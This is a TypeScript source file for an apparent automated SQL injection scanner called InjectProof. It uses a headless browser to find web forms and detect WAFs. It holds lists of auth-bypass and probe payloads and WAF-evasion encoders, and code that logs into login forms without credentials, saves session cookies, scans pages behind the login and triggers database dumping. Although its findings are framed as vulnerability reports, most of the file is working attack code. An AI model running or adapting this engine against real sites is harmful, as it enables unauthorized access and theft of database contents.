// InjectProof — Smart Form SQLi Engine
// Puppeteer-based fully automated form SQLi detection + exploitation
// Discovers forms (including JS/AJAX/onclick), classifies them,
// bypasses WAFs, exploits SQLi, and dumps database contents automatically.

import type { Page } from 'puppeteer';
import type { DetectorResult, Confidence, DiscoveredForm, FormField } from '@/types';
import { HeadlessBrowser, type HeadlessBrowserConfig } from './headless-browser';
import { deepExploitSqli, type SqliExploitResult, type DatabaseInfo } from './sqli-exploiter';
import { buildRequestString, buildResponseString } from '@/lib/utils';
import { COMMON_CVSS_VECTORS, calculateCvssScore, generateCvssVector } from '@/lib/cvss';
import { getCweEntry } from '@/lib/cwe-database';

// ============================================================
// TYPES
// ============================================================

export type FormType = 'login' | 'search' | 'registration' | 'comment' | 'contact' | 'upload' | 'ajax_endpoint' | 'generic';
export type WafType = 'cloudflare' | 'modsecurity' | 'aws_waf' | 'akamai' | 'imperva' | 'f5' | 'custom' | 'none';
export type AttackTechnique = 'error-based' | 'union-based' | 'boolean-blind' | 'time-blind' | 'auth-bypass' | 'stacked';

export interface SmartFormTarget {
    url: string;
    formType: FormType;
    priority: number; // 1=highest
    fields: SmartField[];
    submitSelector: string; // CSS selector for submit button
    method: string;
    action: string;
    enctype: string;
    isAjax: boolean;
    hasOnclick: boolean;
    hasCaptcha: boolean;
    csrfField?: string;
    formSelector: string; // CSS selector to locate this form
}

export interface SmartField {
    name: string;
    type: string;
    selector: string;
    isInjectable: boolean; // potential target
    isAuth: boolean; // username/password/email
    isHidden: boolean;
    defaultValue: string;
    placeholder: string;
}

export interface SmartFormScanResult {
    formsDiscovered: number;
    formsAttacked: number;
    sqliFound: number;
    authBypassed: boolean;
    results: DetectorResult[];
    exploitData?: SqliExploitResult;
    log: SmartFormLog[];
}

export interface SmartFormLog {
    ts: number;
    phase: string;
    msg: string;
    detail?: string;
}

export interface SmartFormScanConfig {
    baseUrl: string;
    requestTimeout: number;
    userAgent: string;
    customHeaders?: Record<string, string>;
    authHeaders?: Record<string, string>;
    cdpEndpoint?: string;
    maxFormsPerPage?: number;
    maxPayloadsPerField?: number;
    enableDeepExploit?: boolean;
}

// ============================================================
// CONSTANTS
// ============================================================

const SQL_ERROR_PATTERNS = [
    /SQL syntax.*MySQL/i, /Warning.*mysql_/i, /MySqlException/i,
    /You have an error in your SQL syntax/i, /valid MySQL result/i,
    /PostgreSQL.*ERROR/i, /pg_query|pg_exec/i, /PSQLException/i,
    /unterminated quoted string/i, /syntax error at or near/i,
    /ORA-\d{5}/i, /Oracle.*Driver/i, /quoted string not properly terminated/i,
    /Microsoft.*ODBC.*SQL Server/i, /Unclosed quotation mark/i,
    /SQLSTATE\[\w+\]/i, /SQL Server.*Driver/i,
    /SQLite.*error/i, /sqlite3\.OperationalError/i, /SQL logic error/i,
    /JDBC.*Exception/i, /Hibernate.*Exception/i,
];

const AUTH_BYPASS_PAYLOADS = [
    "' OR 1=1 -- -",
    "' OR '1'='1' -- -",
    "admin' -- -",
    "' OR 1=1#",
    "') OR ('1'='1",
    "' OR ''='",
    "1' OR '1'='1",
    "admin'/*",
    "' UNION SELECT 1,2,3 -- -",
    "' OR 1=1 LIMIT 1 -- -",
    "admin' OR '1'='1",
    "' OR 1=1; -- -",
    "') OR 1=1 -- -",
    "\" OR 1=1 -- -",
    "\" OR \"\"=\"",
];

const PROBE_PAYLOADS = [
    { payload: "'", name: 'single-quote', type: 'error' as const },
    { payload: "\"", name: 'double-quote', type: 'error' as const },
    { payload: "\\", name: 'backslash', type: 'error' as const },
    { payload: "1' AND '1'='1", name: 'bool-true', type: 'boolean' as const },
    { payload: "1' AND '1'='2", name: 'bool-false', type: 'boolean' as const },
    { payload: "1' OR SLEEP(3)-- -", name: 'time-mysql', type: 'time' as const },
    { payload: "1'; WAITFOR DELAY '0:0:3'-- -", name: 'time-mssql', type: 'time' as const },
    { payload: "1' OR pg_sleep(3)-- -", name: 'time-pg', type: 'time' as const },
    { payload: "' UNION SELECT NULL-- -", name: 'union-1', type: 'union' as const },
    { payload: "' UNION SELECT NULL,NULL-- -", name: 'union-2', type: 'union' as const },
    { payload: "' UNION SELECT NULL,NULL,NULL-- -", name: 'union-3', type: 'union' as const },
];

const WAF_EVASION_ENCODERS: Array<{ name: string; encode: (p: string) => string }> = [
    { name: 'plain', encode: p => p },
    { name: 'inline-comment', encode: p => p.replace(/SELECT/gi, 'SE/*!LECT*/').replace(/UNION/gi, 'UN/*!ION*/').replace(/FROM/gi, 'FR/*!OM*/').replace(/ /g, '/**/') },
    { name: 'case-swap', encode: p => p.split('').map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join('') },
    { name: 'double-encode', encode: p => encodeURIComponent(encodeURIComponent(p)) },
    { name: 'tab-space', encode: p => p.replace(/ /g, '\t') },
    { name: 'newline-space', encode: p => p.replace(/ /g, '\n') },
    { name: 'plus-space', encode: p => p.replace(/ /g, '+') },
    { name: 'hex-keywords', encode: p => p.replace(/SELECT/gi, '0x53454c454354').replace(/UNION/gi, '0x554e494f4e') },
];

const CAPTCHA_SELECTORS = [
    '.g-recaptcha', '#g-recaptcha', '[data-sitekey]',
    '.h-captcha', '#h-captcha',
    '.cf-turnstile', '#cf-turnstile',
    'img[src*="captcha"]', 'input[name*="captcha"]',
];

// ============================================================
// MAIN CLASS: SmartFormScanner
// ============================================================

export class SmartFormScanner {
    private config: SmartFormScanConfig;
    private browser: HeadlessBrowser | null = null;
    private log: SmartFormLog[] = [];
    private detectedWaf: WafType = 'none';
    private sessionCookies: string[] = [];
    private authBypassed = false;

    constructor(config: SmartFormScanConfig) {
        this.config = config;
    }

    private addLog(phase: string, msg: string, detail?: string) {
        this.log.push({ ts: Date.now(), phase, msg, detail });
    }

    // ── PUBLIC: Run full scan on a URL ────────────────────────
    async scanUrl(url: string): Promise<SmartFormScanResult> {
        const results: DetectorResult[] = [];
        let exploitData: SqliExploitResult | undefined;

        this.addLog('init', `Starting smart form scan on ${url}`);

        const browserConfig: HeadlessBrowserConfig = {
            cdpEndpoint: this.config.cdpEndpoint,
            allowLocalFallback: true,
            navigationTimeout: this.config.requestTimeout,
            userAgent: this.config.userAgent,
            extraHeaders: { ...this.config.customHeaders, ...this.config.authHeaders },
        };

        this.browser = new HeadlessBrowser(browserConfig);

        try {
            await this.browser.connect();
            this.addLog('browser', 'Headless browser connected');
        } catch (err) {
            this.addLog('browser', 'Failed to connect headless browser', String(err));
            return { formsDiscovered: 0, formsAttacked: 0, sqliFound: 0, authBypassed: false, results, log: this.log };
        }

        try {
            const page = await this.browser.newPage();

            // Navigate
            await page.goto(url, { waitUntil: 'networkidle2', timeout: this.config.requestTimeout });
            await sleep(1000);
            this.addLog('navigate', `Page loaded: ${url}`);

            // Phase 1: WAF Detection
            this.detectedWaf = await this.detectWaf(page, url);
            this.addLog('waf', `WAF detected: ${this.detectedWaf}`);

            // Phase 2: Discover all forms
            const forms = await this.discoverForms(page, url);
            this.addLog('discovery', `Found ${forms.length} forms`, forms.map(f => `${f.formType}(${f.fields.length} fields)`).join(', '));

            // Sort by priority (login first)
            forms.sort((a, b) => a.priority - b.priority);

            const maxForms = this.config.maxFormsPerPage ?? 20;
            const formsToAttack = forms.filter(f => !f.hasCaptcha).slice(0, maxForms);

            // Phase 3: Attack each form
            for (const form of formsToAttack) {
                this.addLog('attack', `Attacking ${form.formType} form`, `Action: ${form.action}, Fields: ${form.fields.map(f => f.name).join(',')}`);

                // Get injectable fields
                const injectableFields = form.fields.filter(f => f.isInjectable);
                if (injectableFields.length === 0) {
                    this.addLog('skip', `No injectable fields in ${form.formType} form`);
                    continue;
                }

                // Phase 3a: Login forms → Auth Bypass first
                if (form.formType === 'login') {
                    const bypassResult = await this.attemptAuthBypass(page, form, url);
                    if (bypassResult) {
                        results.push(bypassResult);
                        this.authBypassed = true;
                        this.addLog('auth-bypass', '🥳 AUTH BYPASS SUCCESSFUL!');
                    }
                }

                // Phase 3b: Probe each field for SQLi
                for (const field of injectableFields) {
                    const probeResult = await this.probeField(page, form, field, url);
                    if (probeResult) {
                        results.push(probeResult.result);

                        // Phase 3c: InjectProof deep exploitation
                        if (this.config.enableDeepExploit !== false && probeResult.technique) {
                            this.addLog('exploit', `Starting InjectProof deep exploitation via ${probeResult.technique}`);
                            try {
                                const exploit = await this.deepExploitViaForm(page, form, field, probeResult.technique, url);
                                if (exploit) {
                                    exploitData = exploit;
                                    // Update the result with exploit data
                                    probeResult.result.sqliExploitData = JSON.stringify(exploit);
                                    probeResult.result.description += ` Full database structure extracted: ${exploit.databases.length} databases, ${exploit.databases.reduce((s: number, d: DatabaseInfo) => s + d.tables.length, 0)} tables.`;
                                    this.addLog('exploit', `Deep exploitation complete: ${exploit.dbms}, ${exploit.databases.length} DBs`);
                                }
                            } catch (err) {
                                this.addLog('exploit', 'Deep exploitation failed', String(err));
                            }
                        }

                        break; // Found SQLi in this form, move to next form
                    }
                }

                // Reset page state between forms
                try {
                    await page.goto(url, { waitUntil: 'networkidle2', timeout: this.config.requestTimeout });
                    await sleep(500);
                } catch { /* ignore */ }
            }

            // Phase 4: If auth bypassed, recursive scan behind auth
            if (this.authBypassed) {
                this.addLog('recursive', 'Scanning post-auth pages for additional forms...');
                const postAuthForms = await this.recursivePostAuthScan(page, url);
                for (const pResult of postAuthForms) {
                    results.push(pResult);
                }
            }

            await this.browser.closePage(page);
        } finally {
            await this.browser.disconnect();
        }

        return {
            formsDiscovered: this.log.filter(l => l.phase === 'discovery').length > 0
                ? parseInt(this.log.find(l => l.phase === 'discovery')?.msg.match(/(\d+)/)?.[1] || '0')
                : 0,
            formsAttacked: results.length,
            sqliFound: results.filter(r => r.found).length,
            authBypassed: this.authBypassed,
            results,
            exploitData,
            log: this.log,
        };
    }

    // ── WAF Detection ──────────────────────────────────────────
    private async detectWaf(page: Page, url: string): Promise<WafType> {
        try {
            // Send a canary probe that WAFs usually block
            const testUrl = new URL(url);
            testUrl.searchParams.set('vcode_waf_test', "' OR 1=1 --");
            const response = await page.goto(testUrl.toString(), {
                waitUntil: 'domcontentloaded',
                timeout: 10000,
            });

            if (!response) return 'none';
            const headers = response.headers();
            const status = response.status();
            const body = await page.content();

            // Cloudflare
            if (headers['cf-ray'] || headers['server']?.includes('cloudflare') || body.includes('Cloudflare')) return 'cloudflare';
            // ModSecurity
            if (headers['server']?.includes('Mod_Security') || body.includes('ModSecurity') || body.includes('NAXSI')) return 'modsecurity';
            // AWS WAF
            if (headers['x-amzn-requestid'] && (status === 403 || status === 406)) return 'aws_waf';
            // Akamai
            if (headers['x-akamai-transformed'] || body.includes('AkamaiGHost')) return 'akamai';
            // Imperva
            if (headers['x-cdn']?.includes('Imperva') || body.includes('Incapsula')) return 'imperva';
            // F5 BIG-IP
            if (headers['server']?.includes('BIG-IP') || headers['x-cnection']) return 'f5';
            // Generic block
            if (status === 403 || status === 406 || status === 429) return 'custom';

            // Navigate back
            await page.goto(url, { waitUntil: 'networkidle2', timeout: this.config.requestTimeout });
            return 'none';
        } catch {
            return 'none';
        }
    }

    // ── Form Discovery (DOM + MutationObserver + Shadow DOM) ──
    private async discoverForms(page: Page, baseUrl: string): Promise<SmartFormTarget[]> {
        const forms: SmartFormTarget[] = [];

        // Discover via evaluate (handles Shadow DOM)
        const rawForms = await page.evaluate((captchaSelectors: string[]) => {
            const results: Array<{
                action: string; method: string; enctype: string;
                fields: Array<{ name: string; type: string; selector: string; value: string; placeholder: string; hidden: boolean }>;
                submitSelector: string; formSelector: string;
                isAjax: boolean; hasOnclick: boolean; hasCaptcha: boolean;
                csrfField?: string;
            }> = [];

            // Helper: walk shadow DOM recursively
            function getAllForms(root: Document | ShadowRoot | Element): HTMLFormElement[] {
                const found: HTMLFormElement[] = [];
                if (root instanceof Document || root instanceof Element) {
                    root.querySelectorAll('form').forEach(f => found.push(f as HTMLFormElement));
                    // Shadow DOM
                    root.querySelectorAll('*').forEach(el => {
                        if ((el as any).shadowRoot) {
                            found.push(...getAllForms((el as any).shadowRoot));
                        }
                    });
                }
                return found;
            }

            const allForms = getAllForms(document);

            for (let fi = 0; fi < allForms.length; fi++) {
                const form = allForms[fi];
                const fields: typeof results[0]['fields'] = [];
                let csrfField: string | undefined;

                // Inputs
                form.querySelectorAll('input, textarea, select').forEach((el, idx) => {
                    const input = el as HTMLInputElement;
                    const name = input.name || input.id || `field_${fi}_${idx}`;
                    const type = input.type || (el.tagName === 'TEXTAREA' ? 'textarea' : el.tagName === 'SELECT' ? 'select' : 'text');
                    const hidden = type === 'hidden' || input.style.display === 'none';

                    // Detect CSRF tokens
                    if (hidden && (name.toLowerCase().includes('csrf') || name.toLowerCase().includes('token') || name.toLowerCase().includes('_token') || name.toLowerCase().includes('nonce'))) {
                        csrfField = name;
                    }

                    // Build a unique CSS selector
                    let selector = '';
                    if (input.id) selector = `#${input.id}`;
                    else if (input.name) selector = `form:nth-of-type(${fi + 1}) [name="${input.name}"]`;
                    else selector = `form:nth-of-type(${fi + 1}) ${el.tagName.toLowerCase()}:nth-of-type(${idx + 1})`;

                    fields.push({ name, type, selector, value: input.value || '', placeholder: input.placeholder || '', hidden });
                });

                // Find submit button
                let submitSelector = `form:nth-of-type(${fi + 1}) [type="submit"]`;
                const submitBtn = form.querySelector('[type="submit"], button:not([type="button"]):not([type="reset"])');
                if (submitBtn) {
                    if ((submitBtn as HTMLElement).id) submitSelector = `#${(submitBtn as HTMLElement).id}`;
                }
                if (!submitBtn) {
                    // Check outside form buttons that reference this form
                    const formId = form.id;
                    if (formId) {
                        const extBtn = document.querySelector(`[form="${formId}"]`);
                        if (extBtn && (extBtn as HTMLElement).id) submitSelector = `#${(extBtn as HTMLElement).id}`;
                    }
                }

                // Detect onclick/AJAX
                const hasOnclick = !!(submitBtn?.getAttribute('onclick') || form.getAttribute('onsubmit'));
                const formAction = form.action || window.location.href;
                const isAjax = hasOnclick || !!form.querySelector('[onclick]') || (form.getAttribute('onsubmit') || '').includes('fetch') || (form.getAttribute('onsubmit') || '').includes('XMLHttpRequest');

                // Detect CAPTCHA
                const hasCaptcha = captchaSelectors.some(sel => !!form.querySelector(sel));

                results.push({
                    action: formAction,
                    method: (form.method || 'GET').toUpperCase(),
                    enctype: form.enctype || 'application/x-www-form-urlencoded',
                    fields,
                    submitSelector,
                    formSelector: form.id ? `#${form.id}` : `form:nth-of-type(${fi + 1})`,
                    isAjax,
                    hasOnclick,
                    hasCaptcha,
                    csrfField,
                });
            }

            // Also find standalone inputs with nearby buttons (not in any form)
            const standaloneInputs = document.querySelectorAll('input:not(form input), textarea:not(form textarea)');
            if (standaloneInputs.length > 0) {
                const fields: typeof results[0]['fields'] = [];
                standaloneInputs.forEach((el, idx) => {
                    const input = el as HTMLInputElement;
                    const name = input.name || input.id || `standalone_${idx}`;
                    const type = input.type || 'text';
                    let selector = '';
                    if (input.id) selector = `#${input.id}`;
                    else if (input.name) selector = `[name="${input.name}"]`;
                    else selector = `body input:nth-of-type(${idx + 1})`;
                    fields.push({ name, type, selector, value: input.value || '', placeholder: input.placeholder || '', hidden: false });
                });

                if (fields.length > 0) {
                    // Find any nearby button
                    const btn = document.querySelector('button:not(form button), [type="button"]:not(form [type="button"])');
                    results.push({
                        action: window.location.href,
                        method: 'POST',
                        enctype: 'application/x-www-form-urlencoded',
                        fields,
                        submitSelector: btn ? (btn.id ? `#${btn.id}` : 'button') : 'button',
                        formSelector: 'body',
                        isAjax: true,
                        hasOnclick: !!btn?.getAttribute('onclick'),
                        hasCaptcha: false,
                    });
                }
            }

            return results;
        }, CAPTCHA_SELECTORS);

        // Classify and build SmartFormTarget
        for (const raw of rawForms) {
            const formType = this.classifyForm(raw.fields);
            const priority = this.getFormPriority(formType);

            forms.push({
                url: baseUrl,
                formType,
                priority,
                fields: raw.fields.map(f => ({
                    name: f.name,
                    type: f.type,
                    selector: f.selector,
                    isInjectable: this.isFieldInjectable(f),
                    isAuth: this.isAuthField(f),
                    isHidden: f.hidden,
                    defaultValue: f.value,
                    placeholder: f.placeholder,
                })),
                submitSelector: raw.submitSelector,
                method: raw.method,
                action: raw.action,
                enctype: raw.enctype,
                isAjax: raw.isAjax,
                hasOnclick: raw.hasOnclick,
                hasCaptcha: raw.hasCaptcha,
                csrfField: raw.csrfField,
                formSelector: raw.formSelector,
            });
        }

        return forms;
    }

    // ── Form Classification ────────────────────────────────────
    private classifyForm(fields: Array<{ name: string; type: string; placeholder: string }>): FormType {
        const names = fields.map(f => f.name.toLowerCase());
        const types = fields.map(f => f.type.toLowerCase());
        const placeholders = fields.map(f => f.placeholder.toLowerCase());
        const all = [...names, ...placeholders].join(' ');

        if (types.includes('password') || all.includes('login') || all.includes('signin') || all.includes('log in') || (all.includes('password') && (all.includes('user') || all.includes('email')))) return 'login';
        if (all.includes('search') || all.includes('query') || names.includes('q') || names.includes('s') || names.includes('keyword')) return 'search';
        if (all.includes('register') || all.includes('signup') || all.includes('sign up') || all.includes('confirm_password') || all.includes('password_confirm')) return 'registration';
        if (types.includes('textarea') && (all.includes('comment') || all.includes('message') || all.includes('body'))) return 'comment';
        if (all.includes('contact') || (all.includes('email') && all.includes('message'))) return 'contact';
        if (types.includes('file')) return 'upload';
        return 'generic';
    }

    private getFormPriority(type: FormType): number {
        const map: Record<FormType, number> = { login: 1, search: 2, registration: 3, generic: 4, comment: 5, contact: 6, ajax_endpoint: 7, upload: 8 };
        return map[type] ?? 9;
    }

    private isFieldInjectable(f: { name: string; type: string; hidden: boolean }): boolean {
        const skipTypes = ['hidden', 'file', 'image', 'submit', 'button', 'reset', 'checkbox', 'radio'];
        if (skipTypes.includes(f.type.toLowerCase())) return false;
        const skipNames = ['csrf', 'token', 'nonce', '_token', 'captcha'];
        if (skipNames.some(s => f.name.toLowerCase().includes(s))) return false;
        return true;
    }

    private isAuthField(f: { name: string; type: string }): boolean {
        const n = f.name.toLowerCase();
        return f.type === 'password' || n.includes('user') || n.includes('email') || n.includes('login') || n.includes('pass');
    }

    // ── Auth Bypass ────────────────────────────────────────────
    private async attemptAuthBypass(page: Page, form: SmartFormTarget, url: string): Promise<DetectorResult | null> {
        this.addLog('auth-bypass', `Attempting auth bypass on login form (${AUTH_BYPASS_PAYLOADS.length} payloads)`);

        const usernameField = form.fields.find(f => f.isAuth && f.type !== 'password') || form.fields.find(f => f.isInjectable && f.type !== 'password');
        const passwordField = form.fields.find(f => f.type === 'password');
        if (!usernameField) return null;

        const beforeUrl = page.url();
        const beforeContent = await page.content();

        for (const payload of AUTH_BYPASS_PAYLOADS) {
            try {
                // Navigate fresh
                await page.goto(url, { waitUntil: 'networkidle2', timeout: this.config.requestTimeout });
                await sleep(300);

                // Clear and type username payload
                await this.clearAndType(page, usernameField.selector, payload);
                // Type dummy password
                if (passwordField) {
                    await this.clearAndType(page, passwordField.selector, 'password123');
                }

                // Submit
                const responseData = await this.submitFormAndWait(page, form);
                const afterUrl = page.url();
                const afterContent = await page.content();

                // Detect successful bypass
                const urlChanged = afterUrl !== beforeUrl && !afterUrl.includes('login') && !afterUrl.includes('error');
                const contentDiff = Math.abs(afterContent.length - beforeContent.length) > 200;
                const hasAuthIndicators = /dashboard|admin|welcome|profile|logout|sign.?out/i.test(afterContent);
                const noErrorIndicators = !/invalid|incorrect|failed|error|wrong/i.test(afterContent.slice(0, 2000));

                if ((urlChanged || hasAuthIndicators) && noErrorIndicators) {
                    // Save session cookies
                    const cookies = await page.cookies();
                    this.sessionCookies = cookies.map(c => `${c.name}=${c.value}`);

                    const cwe = getCweEntry('CWE-89');
                    const cvssMetrics = COMMON_CVSS_VECTORS.sqli;
                    const cvssScore = calculateCvssScore(cvssMetrics);

                    this.addLog('auth-bypass', `🥳 BYPASS SUCCESS with payload: ${payload}`, `Redirected to: ${afterUrl}`);

                    return {
                        found: true,
                        title: `SQL Injection Auth Bypass on Login Form`,
                        description: `The login form at ${url} is vulnerable to SQL injection authentication bypass. The payload "${payload}" was injected into the "${usernameField.name}" field, allowing login without valid credentials. The application redirected to ${afterUrl}, indicating successful authentication.`,
                        category: 'sqli',
                        severity: 'critical',
                        confidence: 'high' as Confidence,
                        cweId: 'CWE-89',
                        cweTitle: cwe?.title,
                        cvssVector: generateCvssVector(cvssMetrics),
                        cvssScore,
                        affectedUrl: url,
                        httpMethod: form.method,
                        parameter: usernameField.name,
                        parameterType: 'body',
                        injectionPoint: 'login-form',
                        payload,
                        request: `[Smart Form] POST ${form.action}\nField: ${usernameField.name} = ${payload}`,
                        response: `Redirected to: ${afterUrl}\nContent length: ${afterContent.length}`,
                        responseCode: 200,
                        impact: 'Complete authentication bypass. An attacker can login as any user (potentially admin) without knowing their password. This provides full access to the application.',
                        technicalDetail: `Auth bypass via smart form interaction. Payload: "${payload}" injected into field "${usernameField.name}". Post-login URL: ${afterUrl}`,
                        remediation: 'Use parameterized queries for all authentication queries. Never concatenate user input into SQL statements.',
                        reproductionSteps: [
                            `Navigate to: ${url}`,
                            `In the "${usernameField.name}" field, enter: ${payload}`,
                            `Enter any password (e.g., "password123")`,
                            `Click the login button`,
                            `Observe successful login and redirect to: ${afterUrl}`,
                        ],
                        references: ['https://owasp.org/www-community/attacks/SQL_Injection'],
                        mappedOwasp: ['A03:2021'],
                    };
                }
            } catch {
                continue;
            }
        }
        return null;
    }

    // ── Field Probing (detect SQLi type) ───────────────────────
    private async probeField(page: Page, form: SmartFormTarget, field: SmartField, url: string): Promise<{ result: DetectorResult; technique: AttackTechnique } | null> {
        this.addLog('probe', `Probing field "${field.name}" in ${form.formType} form`);

        // Get baseline
        await page.goto(url, { waitUntil: 'networkidle2', timeout: this.config.requestTimeout });
        await sleep(300);

        // Fill normal value and submit
        await this.fillFormExcept(page, form, field.name, 'testvalue');
        const baselineResult = await this.submitFormAndWait(page, form);
        const baselineContent = baselineResult?.content || '';
        const baselineTime = baselineResult?.time || 0;

        // Select payloads based on WAF
        const encoders = this.detectedWaf !== 'none'
            ? WAF_EVASION_ENCODERS
            : [WAF_EVASION_ENCODERS[0]]; // plain only if no WAF

        for (const encoder of encoders) {
            for (const probe of PROBE_PAYLOADS) {
                try {
                    const encodedPayload = encoder.encode(probe.payload);

                    // Navigate fresh
                    await page.goto(url, { waitUntil: 'networkidle2', timeout: this.config.requestTimeout });
                    await sleep(200);

                    // Fill form with payload
                    await this.fillFormExcept(page, form, field.name, 'test');
                    await this.clearAndType(page, field.selector, encodedPayload);

                    // Submit and capture result
                    const result = await this.submitFormAndWait(page, form);
                    if (!result) continue;

                    let sqliDetected = false;
                    let technique: AttackTechnique = 'error-based';
                    let confidence: Confidence = 'high';

                    // Error-based check
                    const errorMatch = SQL_ERROR_PATTERNS.find(p => p.test(result.content));
                    if (errorMatch && probe.type === 'error') {
                        sqliDetected = true;
                        technique = 'error-based';
                        confidence = 'high';
                    }

                    // Time-based check
                    if (probe.type === 'time' && result.time > baselineTime + 2500) {
                        sqliDetected = true;
                        technique = 'time-blind';
                        confidence = 'medium';
                    }

                    // Boolean-based check
                    if (probe.type === 'boolean') {
                        const diff = Math.abs(result.content.length - baselineContent.length);
                        if (probe.name === 'bool-true' && diff > 50) {
                            sqliDetected = true;
                            technique = 'boolean-blind';
                            confidence = 'medium';
                        }
                    }

                    // Union-based check
                    if (probe.type === 'union' && !SQL_ERROR_PATTERNS.some(p => p.test(result.content))) {
                        const contentDiff = Math.abs(result.content.length - baselineContent.length);
                        if (contentDiff > 100) {
                            sqliDetected = true;
                            technique = 'union-based';
                            confidence = 'medium';
                        }
                    }

                    if (sqliDetected) {
                        const cwe = getCweEntry('CWE-89');
                        const cvssMetrics = COMMON_CVSS_VECTORS.sqli;
                        const cvssScore = calculateCvssScore(cvssMetrics);

                        this.addLog('sqli-found', `SQLi confirmed in "${field.name}" via ${technique}`, `Payload: ${encodedPayload}`);

                        return {
                            technique,
                            result: {
                                found: true,
                                title: `SQL Injection (${technique}) in "${field.name}" via Smart Form`,
                                description: `The field "${field.name}" in the ${form.formType} form at ${url} is vulnerable to ${technique} SQL injection. Detected via browser-based form interaction (bypasses CSRF/JS protections).`,
                                category: 'sqli',
                                severity: 'critical',
                                confidence,
                                cweId: 'CWE-89',
                                cweTitle: cwe?.title,
                                cvssVector: generateCvssVector(cvssMetrics),
                                cvssScore,
                                affectedUrl: url,
                                httpMethod: form.method,
                                parameter: field.name,
                                parameterType: 'body',
                                injectionPoint: `${form.formType}-form`,
                                payload: encodedPayload,
                                request: `[Smart Form] ${form.method} ${form.action}\nField: ${field.name} = ${encodedPayload}`,
                                response: result.content.slice(0, 2000),
                                responseCode: 200,
                                responseTime: result.time,
                                impact: 'Full database compromise via browser-based SQLi. This vulnerability bypasses CSRF tokens and JavaScript protections.',
                                technicalDetail: `Detection: ${technique}. WAF: ${this.detectedWaf}. Encoder: ${encoder.name}. ${errorMatch ? `Error pattern: ${errorMatch}` : ''} ${technique === 'time-blind' ? `Response time: ${result.time}ms vs baseline ${baselineTime}ms` : ''}`,
                                remediation: 'Use parameterized queries. Never concatenate user input into SQL.',
                                reproductionSteps: [
                                    `Navigate to: ${url}`,
                                    `Locate the ${form.formType} form`,
                                    `Enter "${encodedPayload}" in the "${field.name}" field`,
                                    `Submit the form`,
                                    `Observe: ${technique === 'error-based' ? 'SQL error in response' : technique === 'time-blind' ? 'delayed response' : 'different response content'}`,
                                ],
                                references: ['https://owasp.org/www-community/attacks/SQL_Injection'],
                                mappedOwasp: ['A03:2021'],
                            },
                        };
                    }
                } catch {
                    continue;
                }
            }
        }

        return null;
    }

    // ── Deep Exploit (InjectProof Engine) ─────────────────────
    private async deepExploitViaForm(page: Page, form: SmartFormTarget, field: SmartField, technique: AttackTechnique, url: string): Promise<SqliExploitResult | null> {
        // Delegate to the InjectProof deep exploitation engine
        // Passes detected WAF type for adaptive evasion during extraction
        try {
            const result = await deepExploitSqli(
                form.action || url,
                form.method,
                field.name,
                'body',
                {
                    requestTimeout: this.config.requestTimeout,
                    userAgent: this.config.userAgent,
                    customHeaders: this.config.customHeaders,
                    authHeaders: this.config.authHeaders,
                    maxDatabases: 50,
                    maxTablesPerDb: 100,
                    maxColumnsPerTable: 50,
                    maxRowsPerTable: 20,
                    wafType: this.detectedWaf !== 'none' ? this.detectedWaf : undefined,
                    preferredTechnique: technique as any,
                },
            );
            return result;
        } catch {
            return null;
        }
    }

    // โ”€โ”€ Recursive Post-Auth Scan โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€
    private async recursivePostAuthScan(page: Page, baseUrl: string): Promise<DetectorResult[]> {
        const results: DetectorResult[] = [];
        const visited = new Set<string>();
        visited.add(baseUrl);

        // Find new links on current page
        const links = await page.evaluate(() => {
            return Array.from(document.querySelectorAll('a[href]'))
                .map(a => (a as HTMLAnchorElement).href)
                .filter(h => h.startsWith(window.location.origin));
        });

        // Visit up to 5 post-auth pages looking for new forms
        for (const link of links.slice(0, 5)) {
            if (visited.has(link)) continue;
            visited.add(link);

            try {
                await page.goto(link, { waitUntil: 'networkidle2', timeout: this.config.requestTimeout });
                await sleep(500);

                const postAuthForms = await this.discoverForms(page, link);
                const injectableForms = postAuthForms.filter(f => !f.hasCaptcha && f.fields.some(fi => fi.isInjectable));

                for (const form of injectableForms.slice(0, 3)) {
                    for (const field of form.fields.filter(f => f.isInjectable)) {
                        const probeResult = await this.probeField(page, form, field, link);
                        if (probeResult) {
                            probeResult.result.title += ' (Post-Auth)';
                            probeResult.result.description += ' This vulnerability was found behind the authentication wall after successful auth bypass.';
                            results.push(probeResult.result);
                            break;
                        }
                    }
                }
            } catch {
                continue;
            }
        }

        return results;
    }

    // โ”€โ”€ Form Interaction Helpers โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€โ”€
    private async clearAndType(page: Page, selector: string, value: string): Promise<void> {
        try {
            await page.waitForSelector(selector, { timeout: 3000 });
            await page.click(selector, { clickCount: 3 }); // select all
            await page.keyboard.press('Backspace');
            await page.type(selector, value, { delay: 10 });
        } catch {
            // Fallback: use evaluate
            await page.evaluate((sel: string, val: string) => {
                const el = document.querySelector(sel) as HTMLInputElement;
                if (el) { el.value = val; el.dispatchEvent(new Event('input', { bubbles: true })); }
            }, selector, value);
        }
    }

    private async fillFormExcept(page: Page, form: SmartFormTarget, exceptField: string, defaultValue: string): Promise<void> {
        for (const field of form.fields) {
            if (field.name === exceptField || field.isHidden) continue;
            if (!field.isInjectable) continue;
            try {
                const val = field.defaultValue || (field.type === 'email' ? 'test@test.com' : defaultValue);
                await this.clearAndType(page, field.selector, val);
            } catch { /* skip */ }
        }
    }

    private async submitFormAndWait(page: Page, form: SmartFormTarget): Promise<{ content: string; time: number; url: string } | null> {
        try {
            const startTime = Date.now();

            // Setup network response listener
            const responsePromise = page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 }).catch(() => null);

            // Try clicking submit button
            try {
                await page.click(form.submitSelector);
            } catch {
                // Fallback: press Enter on last field
                await page.keyboard.press('Enter');
            }

            // Wait for navigation or AJAX response
            await responsePromise;
            await sleep(500);

            const time = Date.now() - startTime;
            const content = await page.content();
            const currentUrl = page.url();

            return { content, time, url: currentUrl };
        } catch {
            return null;
        }
    }
}

// ============================================================
// CONVENIENCE EXPORT
// ============================================================

export async function runSmartFormSqliScan(
    url: string,
    config: SmartFormScanConfig,
): Promise<SmartFormScanResult> {
    const scanner = new SmartFormScanner(config);
    return scanner.scanUrl(url);
}

